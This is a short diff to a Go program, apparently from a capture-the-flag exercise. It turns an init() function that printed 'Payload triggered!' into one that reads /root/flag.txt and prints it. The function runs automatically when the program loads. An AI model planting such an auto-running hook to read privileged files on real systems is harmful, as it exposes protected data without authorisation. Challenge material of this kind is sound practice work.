@@ -1,7 +1,15 @@
 package main
 
-import "fmt"
+import (
+	"fmt"
+	"os"
+)
 
 func init() {
-	fmt.Println("✅ Payload triggered!")
+	data, err := os.ReadFile("/root/flag.txt")
+	if err != nil {
+		fmt.Println("[X] Error reading flag:", err)
+		return
+	}
+	fmt.Println("🏁 FLAG:", string(data))
 }
